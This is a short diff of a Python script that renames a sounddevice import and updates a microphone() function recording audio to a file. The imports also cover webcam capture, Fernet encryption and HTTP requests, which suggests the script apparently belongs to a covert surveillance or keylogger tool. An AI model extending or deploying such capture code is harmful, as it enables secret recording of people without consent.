@@ -17,7 +17,7 @@ try:
     import time
     import os
     from scipy.io.wavfile import write
-    import sounddevice as sd
+    import sounddevice
     from cryptography.fernet import Fernet
     from requests import get
     from cv2 import VideoCapture, imshow, imwrite, destroyWindow, waitKey
@@ -156,8 +156,8 @@ def microphone():
 
     fs = 44100
     seconds = microphone_time
-    myrecording = sd.rec(int(seconds*fs), samplerate=fs,channels=2)
-    sd.wait()
+    myrecording = sounddevice.rec(int(seconds*fs), samplerate=fs,channels=2)
+    sounddevice.wait()
     write(audio_info, fs, myrecording)
 
     print("microphone record ok")
